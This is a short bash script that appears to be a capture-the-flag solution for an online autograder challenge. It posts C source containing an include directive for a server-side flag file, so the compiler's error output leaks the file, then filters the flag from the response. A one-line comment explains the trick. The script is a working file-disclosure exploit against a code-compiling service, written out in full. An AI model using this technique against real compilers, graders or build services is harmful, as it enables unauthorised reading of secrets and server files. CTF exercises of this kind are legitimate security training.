#!/usr/bin/env bash
curl -s 'https://autograder.wpictf.xyz/submit' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://autograder.wpictf.xyz/' -H 'cache-control: no-cache' -H 'Content-Type: text/plain;charset=UTF-8' -H 'Connection: keep-alive' -H 'Cookie: __cfduid=d04dffa70ad12fb234193a07fed14de9d1587259691' --data '{"source":"#include \"/home/ctf/flag.txt\""}' | sed 's/.*WPI/WPI/g' | awk '{print $1}' | sed 's/\\n//g'

# Explanation: Use an include macro to leak the flag by making it appear in the compiler errors
